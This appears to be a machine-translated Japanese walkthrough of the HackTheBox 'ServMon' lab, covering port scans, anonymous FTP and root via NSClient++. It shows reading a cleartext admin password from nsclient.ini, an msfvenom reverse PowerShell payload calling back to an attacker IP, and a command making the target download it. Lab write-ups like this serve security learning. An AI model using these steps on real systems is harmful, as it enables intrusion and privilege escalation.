偵察



このマシンのIPアドレスは10.10.10.184で、/ etc / hostsに追加しています。 



10.10.10.184    servmon.htb


まず、開いているポートをスキャンします。nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。tun0インターフェースからすべてのTCPおよびUDPポートを毎秒500パケットの速度でスキャンします。 



masscan -e tun0 -p1-65535,U:1-65535 10.10.10.184    --rate=500






ホストで多くのポートが開いています。nmapを使用してスキャンし、必要なものをフィルタリングして選択します。 



nmap servmon.htb -p21,80,49667,49669,22,139,49668,8443,49670,6699,6063,49666,5666,5040,7680,49664,49665,445,135






ここで、ポートで機能するサービスに関する詳細情報を取得するには、-Aオプションを指定してスキャンを実行します。 



nmap -A servmon.htb -p21,80,22,139,8443,6699,6063,5666,5040,7680,445,135






nmapスキャンからわかるように、匿名の代わりにFTPサーバーを操作することが可能です。中に入って見回します。







2つのファイルがあります。それらをダウンロードして見てみましょう。

ルート



nmapによって提供されるサービスを検査すると、NSClientはポート8443で実行されます。







そして彼にとっても、私たちは搾取を見つけます。







したがって、権限の低いローカルユーザーは、構成ファイルからクリアテキストのWeb管理者パスワードを読み取ることができます。

NSClient ++サービスはシステムとして実行されるため、低い特権レベルのユーザーは特権の昇格を受け取る可能性があります。

最初のステップは、Web管理者のパスワードを取得することです。

type "c:\program files\nsclient++\nsclient.ini"











許可されたホスト-localhostが表示されます。 SHHポートを取得しましょう。

ssh -L 8444:127.0.0.1:8443 nadine@servmon.htb





この脆弱性では、すべてのアクションを手動で完了しないようにするために、自動化されたRCEエクスプロイトを使用しました。



最初に、リバース接続に対して実行する負荷を生成し、リスナーを実行します。 



msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.60 lport=4321 > ./1.bat






次に、リモートホストで、指定したbatファイルをローカルマシンからダウンロードします。 



powershell -c "wget http://10.10.15.60:88/1.bat -O C:\Temp\a.bat"


すべての準備が整ったら、エクスプロイトを起動します（エクスプロイトは不安定であるか、マシンですが、3回目にのみ正常に実行されました）。







メタスプリットでは、セッションの作成が成功したことを確認します。
